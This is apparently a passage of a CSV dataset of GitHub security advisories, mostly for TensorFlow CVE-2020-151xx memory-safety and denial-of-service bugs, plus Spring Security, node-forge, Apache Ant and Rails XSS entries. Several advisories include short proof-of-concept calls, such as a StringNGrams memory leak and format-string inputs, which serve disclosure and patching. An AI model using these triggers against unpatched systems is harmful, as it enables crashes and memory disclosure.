Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
625,20741,tensorflow,GHSA-q8gv-q7wr-9jf8,CVE-2020-15204,https://github.com/advisories/GHSA-q8gv-q7wr-9jf8,moderate,2020-09-25 18:28:41 UTC,Segfault in Tensorflow,"### Impact
In eager mode, TensorFlow does not set the session state. Hence, calling `tf.raw_ops.GetSessionHandle` or `tf.raw_ops.GetSessionHandleV2` results in a null pointer dereference:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/session_ops.cc#L45

In the above snippet, in eager mode, `ctx->session_state()` returns `nullptr`. Since code immediately dereferences this, we get a segmentation fault.

### Patches
We have patched the issue in 9a133d73ae4b4664d22bd1aa6d654fec13c52ee1 and will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
626,20741,tensorflow,GHSA-w5gh-2wr2-pm6g,CVE-2020-15206,https://github.com/advisories/GHSA-w5gh-2wr2-pm6g,critical,2020-09-25 18:28:40 UTC,Denial of Service in Tensorflow,"### Impact
Changing the TensorFlow's `SavedModel` protocol buffer and altering the name of required keys results in segfaults and data corruption while loading the model. This can cause a denial of service in products using `tensorflow-serving` or other inference-as-a-service installments.

We have added fixes to this in f760f88b4267d981e13f4b302c437ae800445968 and fcfef195637c6e365577829c4d67681695956e7d (both going into TensorFlow 2.2.0 and 2.3.0 but not yet backported to earlier versions). However, this was not enough, as #41097 reports a different failure mode.

### Patches
We have patched the issue in adf095206f25471e864a8e63a0f1caef53a0e3a6 and will release patch releases for all versions between 1.15 and 2.3. Patch releases for versions between 1.15 and 2.1 will also contain cherry-picks of f760f88b4267d981e13f4b302c437ae800445968 and fcfef195637c6e365577829c4d67681695956e7d.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by Shuaike Dong, from Alipay Tian Qian Security Lab && Lab for Applied Security Research, CUHK.",pip
627,20741,tensorflow,GHSA-g7p5-5759-qv46,CVE-2020-15205,https://github.com/advisories/GHSA-g7p5-5759-qv46,critical,2020-09-25 18:28:38 UTC,Data leak in Tensorflow,"### Impact
The `data_splits` argument of [`tf.raw_ops.StringNGrams`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/StringNGrams) lacks validation. This allows a user to pass values that can cause heap overflow errors and even leak contents of memory
```python
>>> tf.raw_ops.StringNGrams(data=[""aa"", ""bb"", ""cc"", ""dd"", ""ee"", ""ff""], data_splits=[0,8], separator="" "", ngram_widths=[3], left_pad="""", right_pad="""", pad_width=0, preserve_short_sequences=False)
StringNGrams(ngrams=<tf.Tensor: shape=(6,), dtype=string, numpy=
array([b'aa bb cc', b'bb cc dd', b'cc dd ee', b'dd ee ff',
       b'ee ff \xf4j\xa7q\x7f\x00\x00q\x00\x00\x00\x00\x00\x00\x00\xd8\x9b~\xa8q\x7f\x00',
       b'ff \xf4j\xa7q\x7f\x00\x00q\x00\x00\x00\x00\x00\x00\x00\xd8\x9b~\xa8q\x7f\x00 \x9b~\xa8q\x7f\x00\x00p\xf5j\xa7q\x7f\x00\x00H\xf8j\xa7q\x7f\x00\x00\xf0\xf3\xf7\x85q\x7f\x00\x00`}\xa6\x00\x00\x00\x00\x00`~\xa6\x00\x00\x00\x00\x00\xb0~\xeb\x9bq\x7f\x00'],...
```

All the binary strings after `ee ff` are contents from the memory stack. Since these can contain return addresses, this data leak can be used to defeat ASLR.

### Patches
We have patched the issue in 0462de5b544ed4731aa2fb23946ac22c01856b80 and will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
628,20741,tensorflow,GHSA-xmq7-7fxm-rr79,CVE-2020-15203,https://github.com/advisories/GHSA-xmq7-7fxm-rr79,high,2020-09-25 18:28:37 UTC,Denial of Service in Tensorflow,"### Impact
By controlling the `fill` argument of [`tf.strings.as_string`](https://www.tensorflow.org/api_docs/python/tf/strings/as_string), a malicious attacker is able to trigger a format string vulnerability due to the way the internal format use in a `printf` call is constructed: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/as_string_op.cc#L68-L74

This can result in unexpected output:
```python
In [1]: tf.strings.as_string(input=[1234], width=6, fill='-')                                                                     
Out[1]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['1234  '], dtype=object)>                                              
In [2]: tf.strings.as_string(input=[1234], width=6, fill='+')                                                                     
Out[2]: <tf.Tensor: shape=(1,), dtype=string, numpy=array([' +1234'], dtype=object)> 
In [3]: tf.strings.as_string(input=[1234], width=6, fill=""h"")                                                                     
Out[3]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['%6d'], dtype=object)> 
In [4]: tf.strings.as_string(input=[1234], width=6, fill=""d"")                                                                     
Out[4]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['12346d'], dtype=object)> 
In [5]: tf.strings.as_string(input=[1234], width=6, fill=""o"")
Out[5]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['23226d'], dtype=object)>
In [6]: tf.strings.as_string(input=[1234], width=6, fill=""x"")
Out[6]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['4d26d'], dtype=object)>
In [7]: tf.strings.as_string(input=[1234], width=6, fill=""g"")
Out[7]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['8.67458e-3116d'], dtype=object)>
In [8]: tf.strings.as_string(input=[1234], width=6, fill=""a"")
Out[8]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['0x0.00ff7eebb4d4p-10226d'], dtype=object)>
In [9]: tf.strings.as_string(input=[1234], width=6, fill=""c"")
Out[9]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['\xd26d'], dtype=object)>
In [10]: tf.strings.as_string(input=[1234], width=6, fill=""p"")
Out[10]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['0x4d26d'], dtype=object)>
In [11]: tf.strings.as_string(input=[1234], width=6, fill='m') 
Out[11]: <tf.Tensor: shape=(1,), dtype=string, numpy=array(['Success6d'], dtype=object)>
```

However, passing in `n` or `s` results in segmentation fault.

### Patches
We have patched the issue in 33be22c65d86256e6826666662e40dbdfe70ee83 and will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
629,20741,tensorflow,GHSA-h6fg-mjxg-hqq4,CVE-2020-15202,https://github.com/advisories/GHSA-h6fg-mjxg-hqq4,critical,2020-09-25 18:28:35 UTC,Integer truncation in Shard API usage,"### Impact
The `Shard` API in TensorFlow expects the last argument to be a function taking two `int64` (i.e., `long long`) arguments:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/util/work_sharder.h#L59-L60

However, there are several places in TensorFlow where a lambda taking `int` or `int32` arguments is being used:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/random_op.cc#L204-L205
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/random_op.cc#L317-L318

In these cases, if the amount of work to be parallelized is large enough, integer truncation occurs. Depending on how the two arguments of the lambda are used, this can result in segfaults, read/write outside of heap allocated arrays, stack overflows, or data corruption.

### Patches
We have patched the issue in 27b417360cbd671ef55915e4bb6bb06af8b8a832 and ca8c013b5e97b1373b3bb1c97ea655e69f31a575. We will release patch releases for all versions between 1.15 and 2.3.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
630,20741,tensorflow,GHSA-p5f8-gfw5-33w4,CVE-2020-15201,https://github.com/advisories/GHSA-p5f8-gfw5-33w4,moderate,2020-09-25 18:28:34 UTC,Heap buffer overflow in Tensorflow,"### Impact
The `RaggedCountSparseOutput` implementation does not validate that the input arguments form a valid ragged tensor. In particular, there is no validation that the values in the `splits` tensor generate a valid partitioning of the `values` tensor. Hence, this code is prone to heap buffer overflow:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/count_ops.cc#L248-L251

If `split_values` does not end with a value at least `num_values` then the `while` loop condition will trigger a read outside of the bounds of `split_values` once `batch_idx` grows too large. 

### Patches
We have patched the issue in 3cbb917b4714766030b28eba9fb41bb97ce9ee02 and will release a patch release.

We recommend users to upgrade to TensorFlow 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
631,20741,tensorflow,GHSA-x7rp-74x2-mjf3,CVE-2020-15200,https://github.com/advisories/GHSA-x7rp-74x2-mjf3,moderate,2020-09-25 18:28:32 UTC,Segfault in Tensorflow,"### Impact
The `RaggedCountSparseOutput` implementation does not validate that the input arguments form a valid ragged tensor. In particular, there is no validation that the values in the `splits` tensor generate a valid partitioning of the `values` tensor. Thus, the [following code](https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/count_ops.cc#L248-L265
) sets up conditions to cause a heap buffer overflow:
```cc
    auto per_batch_counts = BatchedMap<W>(num_batches);
    int batch_idx = 0;
    for (int idx = 0; idx < num_values; ++idx) {
      while (idx >= splits_values(batch_idx)) {
        batch_idx++;
      }
      const auto& value = values_values(idx);
      if (value >= 0 && (maxlength_ <= 0 || value < maxlength_)) {
        per_batch_counts[batch_idx - 1][value] = 1;
      }
    }
```

A `BatchedMap` is equivalent to a vector where each element is a hashmap. However, if the first element of `splits_values` is not 0, `batch_idx` will never be 1, hence there will be no hashmap at index 0 in `per_batch_counts`. Trying to access that in the user code results in a segmentation fault.

### Patches
We have patched the issue in 3cbb917b4714766030b28eba9fb41bb97ce9ee02 and will release a patch release.

We recommend users to upgrade to TensorFlow 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability is a variant of [GHSA-p5f8-gfw5-33w4](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p5f8-gfw5-33w4)",pip
632,20741,tensorflow,GHSA-qc53-44cj-vfvx,CVE-2020-15197,https://github.com/advisories/GHSA-qc53-44cj-vfvx,moderate,2020-09-25 18:28:30 UTC,Denial of Service in Tensorflow,"### Impact
The `SparseCountSparseOutput` implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the `indices` tensor has rank 2. This tensor must be a matrix because code assumes its elements are accessed as elements of a matrix:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/count_ops.cc#L185

However, malicious users can pass in tensors of different rank, resulting in a `CHECK` assertion failure and a crash. This can be used to cause denial of service in serving installations, if users are allowed to control the components of the input sparse tensor.

### Patches
We have patched the issue in 3cbb917b4714766030b28eba9fb41bb97ce9ee02 and will release a patch release.

We recommend users to upgrade to TensorFlow 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability is a variant of [GHSA-p5f8-gfw5-33w4](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p5f8-gfw5-33w4)",pip
633,20741,tensorflow,GHSA-63xm-rx5p-xvqr,CVE-2020-15195,https://github.com/advisories/GHSA-63xm-rx5p-xvqr,high,2020-09-25 18:28:29 UTC,Heap buffer overflow in Tensorflow,"### Impact
The implementation of `SparseFillEmptyRowsGrad` uses a double indexing pattern:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L263-L269

It is possible for `reverse_index_map(i)` to be an index outside of bounds of `grad_values`, thus resulting in a heap buffer overflow.

### Patches
We have patched the issue in 390611e0d45c5793c7066110af37c8514e6a6c54 and will release a patch release for all affected versions.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
634,20741,tensorflow,GHSA-rjjg-hgv6-h69v,CVE-2020-15193,https://github.com/advisories/GHSA-rjjg-hgv6-h69v,high,2020-09-25 18:28:27 UTC,Memory corruption in Tensorflow,"### Impact
The implementation of `dlpack.to_dlpack` can be made to use uninitialized memory resulting in further memory corruption. This is because the pybind11 glue code assumes that the argument is a tensor:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/python/tfe_wrapper.cc#L1361

However, there is nothing stopping users from passing in a Python object instead of a tensor.
```python
In [2]: tf.experimental.dlpack.to_dlpack([2])                                                                                                                                            
==1720623==WARNING: MemorySanitizer: use-of-uninitialized-value                                                                                                                            
    #0 0x55b0ba5c410a in tensorflow::(anonymous namespace)::GetTensorFromHandle(TFE_TensorHandle*, TF_Status*) third_party/tensorflow/c/eager/dlpack.cc:46:7
    #1 0x55b0ba5c38f4 in tensorflow::TFE_HandleToDLPack(TFE_TensorHandle*, TF_Status*) third_party/tensorflow/c/eager/dlpack.cc:252:26
... 
```

The uninitialized memory address is due to a `reinterpret_cast`
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/python/eager/pywrap_tensor.cc#L848-L850

Since the `PyObject` is a Python object, not a TensorFlow Tensor, the cast to `EagerTensor` fails. 

### Patches
We have patched the issue in 22e07fb204386768e5bcbea563641ea11f96ceb8 and will release a patch release for all affected versions.

We recommend users to upgrade to TensorFlow 2.2.1 or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
635,20741,tensorflow,GHSA-q8qj-fc9q-cphr,CVE-2020-15191,https://github.com/advisories/GHSA-q8qj-fc9q-cphr,moderate,2020-09-25 18:28:25 UTC,Undefined behavior in Tensorflow,"### Impact
If a user passes an invalid argument to `dlpack.to_dlpack` the expected validations will cause variables to bind to `nullptr` while setting a `status` variable to the error condition.

However, this `status` argument is not properly checked:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/c/eager/dlpack.cc#L265-L267

Hence, code following these methods will bind references to null pointers:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/c/eager/dlpack.cc#L279-L285

This is undefined behavior and reported as an error if compiling with `-fsanitize=null`.

### Patches
We have patched the issue in 22e07fb204386768e5bcbea563641ea11f96ceb8 and will release a patch release for all affected versions.

We recommend users to upgrade to TensorFlow 2.2.1 or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been discovered during variant analysis of [GHSA-rjjg-hgv6-h69v](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rjjg-hgv6-h69v).",pip
636,20741,tensorflow,GHSA-x5cp-9pcf-pp3h,CVE-2020-15199,https://github.com/advisories/GHSA-x5cp-9pcf-pp3h,moderate,2020-09-25 18:28:24 UTC,Denial of Service in Tensorflow,"### Impact
The `RaggedCountSparseOutput` does not validate that the input arguments form a valid ragged tensor. In particular, there is no validation that the `splits` tensor has the minimum required number of elements. Code uses this quantity to initialize a different data structure:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/count_ops.cc#L241-L244

Since `BatchedMap` is equivalent to a vector, it needs to have at least one element to not be `nullptr`. If user passes a `splits` tensor that is empty or has exactly one element, we get a `SIGABRT` signal raised by the operating system.

### Patches
We have patched the issue in 3cbb917b4714766030b28eba9fb41bb97ce9ee02 and will release a patch release.

We recommend users to upgrade to TensorFlow 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability is a variant of [GHSA-p5f8-gfw5-33w4](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p5f8-gfw5-33w4)",pip
637,20741,tensorflow,GHSA-jc87-6vpp-7ff3,CVE-2020-15198,https://github.com/advisories/GHSA-jc87-6vpp-7ff3,moderate,2020-09-25 18:28:22 UTC,Heap buffer overflow in Tensorflow,"### Impact
The `SparseCountSparseOutput` implementation does not validate that the input arguments form a valid sparse tensor. In particular, there is no validation that the `indices` tensor has the same shape as the `values` one. The values in these tensors are always accessed in parallel:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/count_ops.cc#L193-L195

Thus, a shape mismatch can result in accesses outside the bounds of heap allocated buffers.

### Patches
We have patched the issue in 3cbb917b4714766030b28eba9fb41bb97ce9ee02 and will release a patch release.

We recommend users to upgrade to TensorFlow 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability is a variant of [GHSA-p5f8-gfw5-33w4](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p5f8-gfw5-33w4)",pip
638,20741,tensorflow,GHSA-pg59-2f92-5cph,CVE-2020-15196,https://github.com/advisories/GHSA-pg59-2f92-5cph,high,2020-09-25 18:28:21 UTC,Heap buffer overflow in Tensorflow,"### Impact
The `SparseCountSparseOutput` and `RaggedCountSparseOutput` implementations don't validate that the `weights` tensor has the same shape as the data. The check exists for `DenseCountSparseOutput`, where both tensors are fully specified:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/count_ops.cc#L110-L117

In the sparse and ragged count weights are still accessed in parallel with the data:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/count_ops.cc#L199-L201

But, since there is no validation, a user passing fewer weights than the values for the tensors can generate a read from outside the bounds of the heap buffer allocated for the weights.

### Patches
We have patched the issue in 3cbb917b4714766030b28eba9fb41bb97ce9ee02 and will release a patch release.

We recommend users to upgrade to TensorFlow 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability is a variant of [GHSA-p5f8-gfw5-33w4](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p5f8-gfw5-33w4)",pip
639,20741,tensorflow,GHSA-9mqp-7v2h-2382,CVE-2020-15194,https://github.com/advisories/GHSA-9mqp-7v2h-2382,moderate,2020-09-25 18:28:19 UTC,Denial of Service in Tensorflow,"### Impact
The `SparseFillEmptyRowsGrad` implementation has incomplete validation of the shapes of its arguments:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L235-L241

Although `reverse_index_map_t` and `grad_values_t` are accessed in a similar pattern, only `reverse_index_map_t` is validated to be of proper shape. Hence, malicious users can pass a bad `grad_values_t` to trigger an assertion failure in `vec`, causing denial of service in serving installations.

### Patches
We have patched the issue in 390611e0d45c5793c7066110af37c8514e6a6c54 and will release a patch release for all affected versions.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability is a variant of [GHSA-63xm-rx5p-xvqr](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-63xm-rx5p-xvqr)",pip
640,20741,tensorflow,GHSA-8fxw-76px-3rxv,CVE-2020-15192,https://github.com/advisories/GHSA-8fxw-76px-3rxv,moderate,2020-09-25 18:28:17 UTC,Memory leak in Tensorflow,"### Impact
If a user passes a list of strings to `dlpack.to_dlpack` there is a memory leak following an expected validation failure:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/c/eager/dlpack.cc#L100-L104

The allocated memory is from
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/c/eager/dlpack.cc#L256

The issue occurs because the `status` argument during validation failures is not properly checked:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/c/eager/dlpack.cc#L265-L267

Since each of the above methods can return an error status, the `status` value must be checked before continuing.

### Patches
We have patched the issue in 22e07fb204386768e5bcbea563641ea11f96ceb8 and will release a patch release for all affected versions.

We recommend users to upgrade to TensorFlow 2.2.1 or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been discovered during variant analysis of [GHSA-rjjg-hgv6-h69v](https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rjjg-hgv6-h69v).",pip
641,20741,tensorflow,GHSA-4g9f-63rx-5cw4,CVE-2020-15190,https://github.com/advisories/GHSA-4g9f-63rx-5cw4,moderate,2020-09-25 18:28:14 UTC,Segfault in Tensorflow,"### Impact
The [`tf.raw_ops.Switch`](https://www.tensorflow.org/api_docs/python/tf/raw_ops/Switch) operation takes as input a tensor and a boolean and outputs two tensors. Depending on the boolean value, one of the tensors is exactly the input tensor whereas the other one should be an empty tensor.

However, the eager runtime traverses all tensors in the output:
https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/common_runtime/eager/kernel_and_device.cc#L308-L313

Since only one of the tensors is defined, the other one is `nullptr`, hence we are binding a reference to `nullptr`. This is undefined behavior and reported as an error if compiling with `-fsanitize=null`. In this case, this results in a segmentation fault

### Patches
We have patched the issue in da8558533d925694483d2c136a9220d6d49d843c and will release a patch release for all affected versions.

We recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.",pip
642,34025,org.springframework.security:spring-security-core,GHSA-v35c-49j6-q8hq,CVE-2016-9879,https://github.com/advisories/GHSA-v35c-49j6-q8hq,high,2020-09-15 20:30:34 UTC,Security Constraint Bypass in Spring Security,"Spring Security does not consider URL path parameters when processing security constraints. By adding a URL path parameter with an encoded ""/"" to a request, an attacker may be able to bypass a security constraint. The root cause of this issue is a lack of clarity regarding the handling of path parameters in the Servlet Specification (see below). Some Servlet containers include path parameters in the value returned for getPathInfo() and some do not. Spring Security uses the value returned by getPathInfo() as part of the process of mapping requests to security constraints. The unexpected presence of path parameters can cause a constraint to be bypassed.

Users of Apache Tomcat (all current versions) are not affected by this vulnerability since Tomcat follows the guidance previously provided by the Servlet Expert group and strips path parameters from the value returned by getContextPath(), getServletPath() and getPathInfo() [1].

Users of other Servlet containers based on Apache Tomcat may or may not be affected depending on whether or not the handling of path parameters has been modified.

Users of IBM WebSphere Application Server 8.5.x are known to be affected.

Users of other containers that implement the Servlet specification may be affected.

[1] https://issues.apache.org/bugzilla/show_bug.cgi?id=25015

## Affected Pivotal Products and Versions
Severity is high unless otherwise noted.
- Spring Security 3.2.0 - 3.2.9
- Spring Security 4.0.x - 4.1.3
- Spring Security 4.2.0
- Older unsupported versions are also affected

## Mitigation
Adopting one of the following mitigations will protect against this vulnerability.

- Use a Servlet container known not to include path parameters in the return values for getServletPath() and getPathInfo()
- Upgrading to Spring Security 3.2.10, 4.1.4 or 4.2.1 will reject the request with a RequestRejectedException if the presence of an encoded ""/"" is detected. Note: If you wish to disable this feature it can be disabled by setting the DefaultHttpFirewall.allowUrlEncodedSlash = true. However, disabling this feature will mean applications are vulnerable (in containers that return path parameters in getServletPath() or getPathInfo()).

## Credit
The issue was identified by Shumpei Asahara & Yuji Ito from NTT DATA Corporation and responsibly reported to Pivotal.",maven
643,34025,org.springframework.security:spring-security-core,GHSA-wmv4-5w76-vp9g,CVE-2014-3527,https://github.com/advisories/GHSA-wmv4-5w76-vp9g,critical,2020-09-15 20:16:22 UTC,Authorization Bypass in Spring Security,"When using Spring Security's CAS Proxy ticket authentication a malicious CAS Service could trick another CAS Service into authenticating a proxy ticket that was not associated. This is due to the fact that the proxy ticket authentication uses the information from the HttpServletRequest which is populated based upon untrusted information within the HTTP request.

This means if there are access control restrictions on which CAS services can authenticate to one another, those restrictions can be bypassed.

If users are not using CAS Proxy tickets and not basing access control decisions based upon the CAS Service, then there is no impact to users.

## Mitigation
Users of affected versions should apply the following mitigation:
- Users of 3.2x should upgrade to 3.2.5 or later
- Users of 3.1.x should upgrade to 3.1.7 or later

## Credit
This issue was identified by David Ohsie and brought to our attention by the CAS Development team.",maven
644,17082,node-forge,GHSA-92xj-mqp7-vmcj,CVE-2020-7720,https://github.com/advisories/GHSA-92xj-mqp7-vmcj,high,2020-09-14 21:42:09 UTC,Prototype Pollution in node-forge,The package node-forge before 0.10.0 is vulnerable to Prototype Pollution via the util.setPath function. Note: Version 0.10.0 is a breaking change removing the vulnerable functions.,npm
645,33967,org.apache.ant:ant,GHSA-4p6w-m9wc-c9c9,CVE-2020-1945,https://github.com/advisories/GHSA-4p6w-m9wc-c9c9,moderate,2020-09-14 18:13:29 UTC,Sensitive Data Exposure in Apache Ant,Apache Ant 1.1 to 1.9.14 and 1.10.0 to 1.10.7 uses the default temporary directory identified by the Java system property java.io.tmpdir for several tasks and may thus leak sensitive information. The fixcrlf and replaceregexp tasks also copy files from the temporary directory back into the build tree allowing an attacker to inject modified source files into the build process.,maven
646,19060,actionview,GHSA-cfjv-5498-mph5,CVE-2020-15169,https://github.com/advisories/GHSA-cfjv-5498-mph5,moderate,2020-09-11 15:19:57 UTC,XSS in Action View,"There is a potential Cross-Site Scripting (XSS) vulnerability in Action View's translation helpers. Views that allow the user to control the default (not found) value of the `t` and `translate` helpers could be susceptible to XSS attacks.

### Impact

When an HTML-unsafe string is passed as the default for a missing translation key [named `html` or ending in `_html`](https://guides.rubyonrails.org/i18n.html#using-safe-html-translations), the default string is incorrectly marked as HTML-safe and not escaped. Vulnerable code may look like the following examples:

```erb
<%# The welcome_html translation is not defined for the current locale: %>
<%= t(""welcome_html"", default: untrusted_user_controlled_string) %>

<%# Neither the title.html translation nor the missing.html translation is defined for the current locale: %>
<%= t(""title.html"", default: [:""missing.html"", untrusted_user_controlled_string]) %>
```

### Patches

Patched Rails versions, 6.0.3.3 and 5.2.4.4, are available from the normal locations.

The patches have also been applied to the `master`, `6-0-stable`, and `5-2-stable` branches on GitHub. If you track any of these branches, you should update to the latest.

To aid users who aren’t able to upgrade immediately, we’ve provided patches for the two supported release series. They are in git-am format and consist of a single changeset.

* [5-2-translate-helper-xss.patch](https://gist.github.com/georgeclaghorn/a466e103922ee81f24c32c9034089442#file-5-2-translate-helper-xss-patch) — patch for the 5.2 release series
* [6-0-translate-helper-xss.patch](https://gist.github.com/georgeclaghorn/a466e103922ee81f24c32c9034089442#file-6-0-translate-helper-xss-patch) — patch for the 6.0 release series

Please note that only the 5.2 and 6.0 release series are currently supported. Users of earlier, unsupported releases are advised to update as soon as possible, as we cannot provide security fixes for unsupported releases.

### Workarounds

Impacted users who can’t upgrade to a patched Rails version can avoid this issue by manually escaping default translations with the `html_escape` helper (aliased as `h`):

```erb
<%= t(""welcome_html"", default: h(untrusted_user_controlled_string)) %>
```",rubygems
